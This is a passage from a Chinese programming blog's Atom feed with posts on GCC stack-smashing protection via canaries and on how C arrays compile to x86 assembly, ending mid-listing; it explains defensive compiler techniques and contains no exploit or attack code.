</code></pre><h2 id="文本编辑指令"><a href="#文本编辑指令" class="headerlink" title="文本编辑指令"></a>文本编辑指令</h2><h2 id="磁盘操作指令"><a href="#磁盘操作指令" class="headerlink" title="磁盘操作指令"></a>磁盘操作指令</h2><h2 id="网络通信指令"><a href="#网络通信指令" class="headerlink" title="网络通信指令"></a>网络通信指令</h2><h2 id="系统管理指令"><a href="#系统管理指令" class="headerlink" title="系统管理指令"></a>系统管理指令</h2><h2 id="系统设置指令"><a href="#系统设置指令" class="headerlink" title="系统设置指令"></a>系统设置指令</h2><h2 id="其他常见指令"><a href="#其他常见指令" class="headerlink" title="其他常见指令"></a>其他常见指令</h2>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h2&gt;&lt;p&gt;本文章记录自己学习Linux路上的点点滴滴。&lt;/p&gt;
&lt;h2 id=&quot;文本操作命令&quot;&gt;&lt;a href=&quot;#文本操作命令&quot; class=&quot;he
    
    </summary>
    
      <category term="工具" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="工具" scheme="http://yoursite.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>深入理解计算机系统|Linux下缓冲区溢出攻击的原理及对策</title>
    <link href="http://yoursite.com/2018/05/10/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-Linux%E4%B8%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AF%B9%E7%AD%96/"/>
    <id>http://yoursite.com/2018/05/10/深入理解计算机系统-Linux下缓冲区溢出攻击的原理及对策/</id>
    <published>2018-05-09T23:03:40.000Z</published>
    <updated>2018-05-09T15:12:43.328Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.ibm.com/developerworks/cn/linux/l-overflow/index.html" target="_blank" rel="external">Linux下缓冲区溢出攻击的原理及对策</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://www.ibm.com/developerworks/cn/linux/l-overflow/index.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Linux下缓冲区溢出攻击的原理及对策&lt;/a&gt;&lt;/p&gt;

    
    </summary>
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/categories/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/tags/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>深入理解计算机系统|编译器堆栈保护原理</title>
    <link href="http://yoursite.com/2018/05/09/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E7%BC%96%E8%AF%91%E5%99%A8%E5%A0%86%E6%A0%88%E4%BF%9D%E6%8A%A4%E5%8E%9F%E7%90%86/"/>
    <id>http://yoursite.com/2018/05/09/深入理解计算机系统-编译器堆栈保护原理/</id>
    <published>2018-05-09T00:44:38.000Z</published>
    <updated>2018-05-08T17:29:55.187Z</updated>
    
    <content type="html"><![CDATA[<h3 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h3><p>以堆栈溢出为代表的缓冲区溢出已成为最为普遍的安全漏洞。由此引发的安全问题比比皆是。早在 1988 年，美国康奈尔大学的计算机科学系研究生莫里斯 (Morris) 利用 UNIX fingered 程序的溢出漏洞，写了一段恶意程序并传播到其他机器上，结果造成 6000 台 Internet 上的服务器瘫痪，占当时总数的 10%。各种操作系统上出现的溢出漏洞也数不胜数。为了尽可能避免缓冲区溢出漏洞被攻击者利用，现今的编译器设计者已经开始在编译器层面上对堆栈进行保护。现在已经有了好几种编译器堆栈保护的实现，其中最著名的是 StackGuard 和 Stack-smashing Protection (SSP，又名 ProPolice）。</p>
<h3 id="编译器堆栈保护原理"><a href="#编译器堆栈保护原理" class="headerlink" title="编译器堆栈保护原理"></a>编译器堆栈保护原理</h3><p>我们知道攻击者利用堆栈溢出漏洞时，通常会破坏当前的函数栈。例如，攻击者利用清单 1 中的函数的堆栈溢出漏洞时，典型的情况是攻击者会试图让程序往 name 数组中写超过数组长度的数据，直到函数栈中的返回地址被覆盖，使该函数返回时跳转至攻击者注入的恶意代码或 shellcode 处执行。溢出攻击后，函数栈变成了图 2 所示的情形，与溢出前（图 1）比较可以看出原本堆栈中的 EBP，返回地址已经被溢出字符串覆盖，即函数栈已经被破坏。</p>
<pre><code>int vulFunc() {
    char name[10];
    //…
    return 0;
}
</code></pre><p>溢出前的函数栈<br><img src="/images/堆栈溢出-01.jpg" alt="堆栈溢出"></p>
<p>出后的函数栈<br><img src="/images/堆栈溢出-02.jpg" alt="堆栈溢出"></p>
<p>如果能在运行时检测出这种破坏，就有可能对函数栈进行保护。目前的堆栈保护实现大多使用基于 “Canaries” 的探测技术来完成对这种破坏的检测。</p>
<h3 id="“Canaries”-探测"><a href="#“Canaries”-探测" class="headerlink" title="“Canaries” 探测"></a>“Canaries” 探测</h3><p>要检测对函数栈的破坏，需要修改函数栈的组织，在缓冲区和控制信息（如 EBP 等）间插入一个 canary word。这样，当缓冲区被溢出时，在返回地址被覆盖之前 canary word 会首先被覆盖。通过检查 canary word 的值是否被修改，就可以判断是否发生了溢出攻击。</p>
<p>常见的 canary word：</p>
<ul>
<li><p><strong>Terminator canaries</strong><br>由于绝大多数的溢出漏洞都是由那些不做数组越界检查的 C 字符串处理函数引起的，而这些字符串都是以 NULL 作为终结字符的。选择 NULL, CR, LF 这样的字符作为 canary word 就成了很自然的事情。例如，若 canary word 为 0x000aff0d，为了使溢出不被检测到，攻击者需要在溢出字符串中包含 0x000aff0d 并精确计算 canaries 的位置，使 canaries 看上去没有被改变。然而，0x000aff0d 中的 0x00 会使 strcpy() 结束复制从而防止返回地址被覆盖。而 0x0a 会使 gets() 结束读取。插入的 terminator canaries 给攻击者制造了很大的麻烦。</p>
</li>
<li><p><strong>Random canaries</strong><br>这种 canaries 是<code>随机产生</code>的。并且这样的随机数通常不能被攻击者读取。这种随机数在程序初始化时产生，然后保存在一个未被隐射到虚拟地址空间的内存页中。这样当攻击者试图通过指针访问保存随机数的内存时就会引发 segment fault。但是由于这个随机数的副本最终会作为 canary word 被保存在函数栈中，攻击者仍有可能通过函数栈获得 canary word 的值。</p>
</li>
<li><p><strong>andom XOR canaries</strong><br>这种 canaries 是由一个随机数和函数栈中的所有控制信息、返回地址通过异或运算得到。这样，函数栈中的 canaries 或者任何控制信息、返回地址被修改就都能被检测到了。</p>
</li>
</ul>
<p>目前主要的编译器堆栈保护实现，如 Stack Guard，Stack-smashing Protection(SSP) 均把 Canaries 探测作为主要的保护技术，但是 Canaries 的产生方式各有不同。下面以 GCC 为例，简要介绍堆栈保护技术在 GCC 中的应用。</p>
<h3 id="GCC-中的堆栈保护实现"><a href="#GCC-中的堆栈保护实现" class="headerlink" title="GCC 中的堆栈保护实现"></a>GCC 中的堆栈保护实现</h3><p>GCC 4.1 中三个与堆栈保护有关的编译选项</p>
<ul>
<li><p><code>-fstack-protector</code>：启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码。</p>
</li>
<li><p><code>-fstack-protector-all</code>：启用堆栈保护，为所有函数插入保护代码。</p>
</li>
<li><p><code>-fno-stack-protector</code>：禁用堆栈保护。</p>
</li>
</ul>
<h4 id="GCC-中的-Canaries-探测"><a href="#GCC-中的-Canaries-探测" class="headerlink" title="GCC 中的 Canaries 探测"></a>GCC 中的 Canaries 探测</h4><p>下面通过一个例子分析 GCC 堆栈保护所生成的代码。分别使用 <code>-fstack-protector</code> 选项和 <code>-fno-stack-protector</code> 编译清单2中的代码得到可执行文件 demo_sp (-fstack-protector)，demo_nosp (-fno-stack-protector)。</p>
<pre><code>int main() {
    int i;
    char buffer[64];
    i = 1;
    buffer[0] = &apos;a&apos;;
    return 0;
}
</code></pre><p>然后用 gdb 分别反汇编 demo_sp，deno_nosp。</p>
<p>demo_nosp 的汇编代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">(gdb) disas main</div><div class="line">Dump of assembler code for function main:</div><div class="line">0x08048344 &lt;main+0&gt;:    lea    0x4(%esp),%ecx</div><div class="line">0x08048348 &lt;main+4&gt;:    and    $0xfffffff0,%esp</div><div class="line">0x0804834b &lt;main+7&gt;:    pushl  0xfffffffc(%ecx)</div><div class="line">0x0804834e &lt;main+10&gt;:   push   %ebp</div><div class="line">0x0804834f &lt;main+11&gt;:   mov    %esp,%ebp</div><div class="line">0x08048351 &lt;main+13&gt;:   push   %ecx</div><div class="line">0x08048352 &lt;main+14&gt;:   sub    $0x50,%esp</div><div class="line">0x08048355 &lt;main+17&gt;:   movl   $0x1,0xfffffff8(%ebp)</div><div class="line">0x0804835c &lt;main+24&gt;:   movb   $0x61,0xffffffb8(%ebp)</div><div class="line">0x08048360 &lt;main+28&gt;:   mov    $0x0,%eax</div><div class="line">0x08048365 &lt;main+33&gt;:   add    $0x50,%esp</div><div class="line">0x08048368 &lt;main+36&gt;:   pop    %ecx</div><div class="line">0x08048369 &lt;main+37&gt;:   pop    %ebp</div><div class="line">0x0804836a &lt;main+38&gt;:   lea    0xfffffffc(%ecx),%esp</div><div class="line">0x0804836d &lt;main+41&gt;:   ret    </div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure>
<p>demo_sp 的汇编代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">(gdb) disas main</div><div class="line">Dump of assembler code for function main:</div><div class="line">0x08048394 &lt;main+0&gt;:    lea    0x4(%esp),%ecx</div><div class="line">0x08048398 &lt;main+4&gt;:    and    $0xfffffff0,%esp</div><div class="line">0x0804839b &lt;main+7&gt;:    pushl  0xfffffffc(%ecx)</div><div class="line">0x0804839e &lt;main+10&gt;:   push   %ebp</div><div class="line">0x0804839f &lt;main+11&gt;:   mov    %esp,%ebp</div><div class="line">0x080483a1 &lt;main+13&gt;:   push   %ecx</div><div class="line">0x080483a2 &lt;main+14&gt;:   sub    $0x54,%esp</div><div class="line">0x080483a5 &lt;main+17&gt;:   mov    %gs:0x14,%eax</div><div class="line">0x080483ab &lt;main+23&gt;:   mov    %eax,0xfffffff8(%ebp)</div><div class="line">0x080483ae &lt;main+26&gt;:   xor    %eax,%eax</div><div class="line">0x080483b0 &lt;main+28&gt;:   movl   $0x1,0xffffffb4(%ebp)</div><div class="line">0x080483b7 &lt;main+35&gt;:   movb   $0x61,0xffffffb8(%ebp)</div><div class="line">0x080483bb &lt;main+39&gt;:   mov    $0x0,%eax</div><div class="line">0x080483c0 &lt;main+44&gt;:   mov    0xfffffff8(%ebp),%edx</div><div class="line">0x080483c3 &lt;main+47&gt;:   xor    %gs:0x14,%edx</div><div class="line">0x080483ca &lt;main+54&gt;:   je     0x80483d1 &lt;main+61&gt;</div><div class="line">0x080483cc &lt;main+56&gt;:   call   0x80482fc &lt;__stack_chk_fail@plt&gt;</div><div class="line">0x080483d1 &lt;main+61&gt;:   add    $0x54,%esp</div><div class="line">0x080483d4 &lt;main+64&gt;:   pop    %ecx</div><div class="line">0x080483d5 &lt;main+65&gt;:   pop    %ebp</div><div class="line">0x080483d6 &lt;main+66&gt;:   lea    0xfffffffc(%ecx),%esp</div><div class="line">0x080483d9 &lt;main+69&gt;:   ret    </div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure></p>
<p>demo_nosp 的汇编代码中地址为 0x08048344 的指令将 esp+4 存入 ecx，此时 esp 指向的内存中保存的是返回地址。地址为 0x0804834b 的指令将 ecx-4 所指向的内存压栈，由于之前已将 esp+4 存入 ecx，所以该指令执行后原先 esp 指向的内容将被压栈，即返回地址被再次压栈。0x08048348 处的 and 指令使堆顶以 16 字节对齐。从 0x0804834e 到 0x08048352 的指令是则保存了旧的 EBP，并为函数设置了新的栈框。当函数完成时，0x08048360 处的 mov 指令将返回值放入 EAX，然后恢复原来的 EBP，ESP。不难看出，demo_nosp 的汇编代码中，没有任何对堆栈进行检查和保护的代码。</p>
<p>将用 <code>-fstack-protector</code> 选项编译的 demo_sp 与没有堆栈保护的 demo_nosp 的汇编代码相比较，两者最显著的区别就是在函数真正执行前多了 3 条语句：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">0x080483a5 &lt;main+17&gt;:   mov    %gs:0x14,%eax</div><div class="line">0x080483ab &lt;main+23&gt;:   mov    %eax,0xfffffff8(%ebp)</div><div class="line">0x080483ae &lt;main+26&gt;:   xor    %eax,%eax</div></pre></td></tr></table></figure>
<p>在函数返回前又多了 4 条语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">0x080483c0 &lt;main+44&gt;:   mov    0xfffffff8(%ebp),%edx</div><div class="line">0x080483c3 &lt;main+47&gt;:   xor    %gs:0x14,%edx</div><div class="line">0x080483ca &lt;main+54&gt;:   je     0x80483d1 &lt;main+61&gt;</div><div class="line">0x080483cc &lt;main+56&gt;:   call   0x80482fc &lt;__stack_chk_fail@plt&gt;</div></pre></td></tr></table></figure></p>
<p>这多出来的语句便是 SSP 堆栈保护的关键所在，通过这几句代码就在函数栈框中插入了一个 Canary，并实现了通过这个 canary 来检测函数栈是否被破坏。</p>
<p><code>%gs:0x14</code> 中保存是一个随机数，0x080483a5 到 0x080483ae 处的 3 条语句将这个随机数放入了栈中 [EBP-8] 的位置。函数返回前 0x080483c0 到 0x080483cc 处的 4 条语句则将栈中 [EBP-8] 处保存的 Canary 取出并与 %gs:0x14 中的随机数作比较。若不等，则说明函数执行过程中发生了溢出，函数栈框已经被破坏，此时程序会跳转到 <code>__stack_chk_fail</code> 输出错误消息然后中止运行。若相等，则函数正常返回。</p>
<p>文章来源：<a href="https://www.ibm.com/developerworks/cn/linux/l-cn-gccstack/index.html" target="_blank" rel="external">IBM-GCC 中的编译器堆栈保护技术</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h3&gt;&lt;p&gt;以堆栈溢出为代表的缓冲区溢出已成为最为普遍的安全漏洞。由此引发的安全问题比比皆是。早在 1988 年，美国康奈尔大学的计算机科学系研究生莫里
    
    </summary>
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/categories/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/tags/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>深入理解计算机系统|汇编的世界-6</title>
    <link href="http://yoursite.com/2018/05/09/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E6%B1%87%E7%BC%96%E7%9A%84%E4%B8%96%E7%95%8C-6/"/>
    <id>http://yoursite.com/2018/05/09/深入理解计算机系统-汇编的世界-6/</id>
    <published>2018-05-08T16:39:30.000Z</published>
    <updated>2018-05-08T15:18:05.606Z</updated>
    
    <content type="html"><![CDATA[<p>现在我们一起去探讨C语言中数组、结构体的实现，相比之下，数组与流程控制和过程的实现难度差不多，尤其是动态数组可能相对来说困难一点。</p>
<h3 id="数组简介"><a href="#数组简介" class="headerlink" title="数组简介"></a>数组简介</h3><p><code>数组</code>，它就是一个相同数据类型的数据集合。数组存储在一系列逻辑上连续的内存块当中，之所以说是逻辑上连续，是因为整个内存或者说存储器本身就是逻辑上连续的一个大内存数组。</p>
<p>C语言中数组的定义：<code>int arr[length]</code>。这当中<code>int</code>表示数据类型，<code>arr</code>是变量名称，<code>length</code>是数组长度。这样的声明会做两件事，首先是在内存当中开辟一个长为<code>lentth*sizeof(int)</code>的内存空间（其中sizeof(int)是指int数据类型的字节长度），然后将这块内存空间的起始地址赋给变量<code>arr</code>。当我们使用<code>arr[index]</code>去读取数组元素的时候，我们会去读<code>arr+index*sizeof(int)</code>的内存位置，这一点并不难理解。如果你足够细心，你会发现<strong>变量名 arr 在这里就是一个指向数组第一个元素的地址，也就是 <code>arr = &amp;arr[0]</code></strong>，这也是数组的一大特性，本文也会着重探讨这一特性。</p>
<h3 id="指针与数组"><a href="#指针与数组" class="headerlink" title="指针与数组"></a>指针与数组</h3><p>关于c语言，需要注意的是：</p>
<ul>
<li><p>C语言中只有一维数组，数组大小在编译期就要明确。同时，数组的元素可以是任意类型的对象，可以是整数、结构体…任意的对象自然也还包括数组，所以就能根据这个“仿真”出多维数组。</p>
</li>
<li><p>对于数组，我们只能做两件事：</p>
<ul>
<li><p>确定大小</p>
</li>
<li><p>获得指向数组下标为0的指针</p>
</li>
</ul>
</li>
</ul>
<p>所以，我们知道我们对数组的操作，都是在通过操作指向数组下标为0的指针进行的。来看个例子：</p>
<pre><code>int a[3];

int * p = a;

print(&quot;%d&quot;,*p);
</code></pre><p>上述例子会打印出 a[0] 的值，所以我们得知 数组名就是指向数组下标为0的元素的指针。在进一步，对于p+1，我们得到了数组下标为1的指针。总的来说，*(a+i)就是数组中下标为i的元素的引用。</p>
<h3 id="定长和变长数组"><a href="#定长和变长数组" class="headerlink" title="定长和变长数组"></a>定长和变长数组</h3><p>要理解定长和变长数组，我们必须搞清楚一个概念，就是说这个“定”和“变”是针对什么来说的。在这里我们说，这两个字是针对编译器来说的，也就是说，如果在编译时数组的长度确定，我们就称为定长数组，反之则称为变长数组。</p>
<p>现在我们一起分析一个有关数组的C程序，我们先来一个简单的，也就是一个定长数组，我们看下在汇编级别是如何操作定长数组的。需要一提的是，由于数组的长度固定，所以有的时候编译器会根据实际情况作出一些优化，以下是一个简单的小程序。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">int main()&#123;</div><div class="line"></div><div class="line">    int a[5];</div><div class="line"></div><div class="line">    int i,sum;</div><div class="line"></div><div class="line">    for(i = 0 ; i &lt; 5; i++)&#123;</div><div class="line"></div><div class="line">        a[i] = i * 3;</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    for(i = 0 ; i &lt; 5; i++)&#123;</div><div class="line"></div><div class="line">        sum += a[i];</div><div class="line"></div><div class="line">    &#125; </div><div class="line"></div><div class="line">    return sum;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>同样通过-S得到下来汇编代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">main:</div><div class="line"></div><div class="line">    pushl    %ebp</div><div class="line"></div><div class="line">    movl    %esp, %ebp//到此准备好栈帧</div><div class="line"></div><div class="line">    subl    $32, %esp//分配32个字节的空间</div><div class="line"></div><div class="line">    leal    -20(%ebp), %edx//将帧指针减去20赋给%edx寄存器？为什么？你能猜到吗？</div><div class="line"></div><div class="line">    movl    $0, %eax//将%eax设置为0，这里的%eax寄存器是重点</div><div class="line"></div><div class="line">.L2:</div><div class="line"></div><div class="line">    movl    %eax, (%edx)//将0放入帧指针减去20的位置？</div><div class="line"></div><div class="line">    addl    $3, %eax//第一次循环时，%eax为3，对于i来说，%eax=(i+1)*3。</div><div class="line"></div><div class="line">    addl    $4, %edx//将%edx加上4，第一次循环%edx指向帧指针-16的位置</div><div class="line"></div><div class="line">    cmpl    $15, %eax//比较%eax和15？</div><div class="line"></div><div class="line">    jne    .L2//如果不相等的话就回到L2</div><div class="line"></div><div class="line">    movl    -20(%ebp), %eax//下面这五句指令已经出卖了leal指令，很明显从-20到-4，就是数组五个元素存放的地方。下面的就不解释了，直接依次相加然后返回结果。</div><div class="line"></div><div class="line">    addl    -16(%ebp), %eax</div><div class="line"></div><div class="line">    addl    -12(%ebp), %eax</div><div class="line"></div><div class="line">    addl    -8(%ebp), %eax</div><div class="line"></div><div class="line">    addl    -4(%ebp), %eax</div><div class="line"></div><div class="line">    leave</div><div class="line"></div><div class="line">    ret</div></pre></td></tr></table></figure>
<p>对于汇编指令就不多说了，我们主要来看下跟数组相关的地方。上面其实并没有完全解释清楚数组的赋值操作那一部分，但是后面求和的部分却已经十分清楚了，现在贴心的我就帮各位串联一下赋值的部分。为了更加清晰，直接上图。我们看下循环过程中是怎么计算的。</p>
<p><img src="/images/汇编-30.png" alt="数组"></p>
<p>看了这个图相信各位更加清楚程序的意图了，开始将<code>%ebp</code>减去20是为了依次给数组赋值。这里编译器用了非常变态的优化技巧。那就是编译器发现了<code>a[i+1] = a[i] + 3</code>的规律，因此使用加法（将<code>%eax</code>不断加3）代替了<code>i*3</code>的乘法操作，另外也使用了加法（即地址不断加4，而不使用起始地址加上索引乘以4的方式）代替了数组元素地址计算过程中的乘法操作。而循环条件当中的<code>i&lt;5</code>，也变成了<code>3*i&lt;15</code>，而<code>3*i</code>又等于<code>a[i]</code>，因此当整个数组当中循环的索引<code>i</code>，满足<code>a[i+1]=15</code>（注意，在循环内的时候，<code>%eax</code>一直储存着<code>a[i+1]</code>的值，除了刚开始的0）的时候。什么时候结束循环，也就是<code>coml和jne指令</code>所做的事。再一次惊叹编译器的神奇。</p>
<p>搞清楚了上面定长数组的实现，我们会发现，定长数组可以做很多的优化，想象一下，如果上面的数组长度是不定的，编译器还能算出15这个数值吗。接下来我们就来看一个和上面的代码几乎一模一样的程序，只不过这里将换成变长数组。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">int sum(int n)&#123;</div><div class="line"></div><div class="line">    int a[n];</div><div class="line"></div><div class="line">    int i,sum;</div><div class="line"></div><div class="line">    for(i = 0 ; i &lt; n; i++)&#123;</div><div class="line"></div><div class="line">        a[i] = i * 3;</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    for(i = 0 ; i &lt; n; i++)&#123;</div><div class="line"></div><div class="line">        sum += a[i];</div><div class="line"></div><div class="line">    &#125; </div><div class="line"></div><div class="line">    return sum;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>可以看到，我们改了一下函数名称，并给函数加了个参数n并将a变为变长数组，其它没做任何改动。下面我们来看下-S和-O1下的汇编代码，看看与定长数组的差距在哪里。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">.file    &quot;arr.c&quot;</div><div class="line"></div><div class="line">    .text</div><div class="line"></div><div class="line">.globl sum</div><div class="line"></div><div class="line">    .type    sum, @function</div><div class="line"></div><div class="line">sum:</div><div class="line"></div><div class="line">    pushl    %ebp</div><div class="line"></div><div class="line">    movl    %esp, %ebp</div><div class="line"></div><div class="line">    pushl    %esi</div><div class="line"></div><div class="line">    pushl    %ebx</div><div class="line"></div><div class="line">    subl    $16, %esp</div><div class="line"></div><div class="line">    movl    8(%ebp), %ebx</div><div class="line"></div><div class="line">    movl    %gs:20, %edx</div><div class="line"></div><div class="line">    movl    %edx, -12(%ebp)</div><div class="line"></div><div class="line">    xorl    %edx, %edx</div><div class="line"></div><div class="line">    leal    30(,%ebx,4), %edx</div><div class="line"></div><div class="line">    andl    $-16, %edx</div><div class="line"></div><div class="line">    subl    %edx, %esp</div><div class="line"></div><div class="line">    leal    15(%esp), %esi</div><div class="line"></div><div class="line">    andl    $-16, %esi</div><div class="line"></div><div class="line">    testl    %ebx, %ebx</div><div class="line"></div><div class="line">    jle    .L2</div><div class="line"></div><div class="line">    movl    $0, %ecx</div><div class="line"></div><div class="line">    movl    $0, %edx</div><div class="line"></div><div class="line">.L3:</div><div class="line"></div><div class="line">    movl    %ecx, (%esi,%edx,4)</div><div class="line"></div><div class="line">    addl    $1, %edx</div><div class="line"></div><div class="line">    addl    $3, %ecx</div><div class="line"></div><div class="line">    cmpl    %ebx, %edx</div><div class="line"></div><div class="line">    jne    .L3</div><div class="line"></div><div class="line">    movl    $0, %edx</div><div class="line"></div><div class="line">.L4:</div><div class="line"></div><div class="line">    addl    (%esi,%edx,4), %eax</div><div class="line"></div><div class="line">    addl    $1, %edx</div><div class="line"></div><div class="line">    cmpl    %ebx, %edx</div><div class="line"></div><div class="line">    jne    .L4</div><div class="line"></div><div class="line">.L2:</div><div class="line"></div><div class="line">    movl    -12(%ebp), %edx</div><div class="line"></div><div class="line">    xorl    %gs:20, %edx</div><div class="line"></div><div class="line">    je    .L6</div><div class="line"></div><div class="line">    call    __stack_chk_fail</div><div class="line"></div><div class="line">.L6:</div><div class="line"></div><div class="line">    leal    -8(%ebp), %esp</div><div class="line"></div><div class="line">    popl    %ebx</div><div class="line"></div><div class="line">    popl    %esi</div><div class="line"></div><div class="line">    popl    %ebp</div><div class="line"></div><div class="line">    .p2align 4,,1</div><div 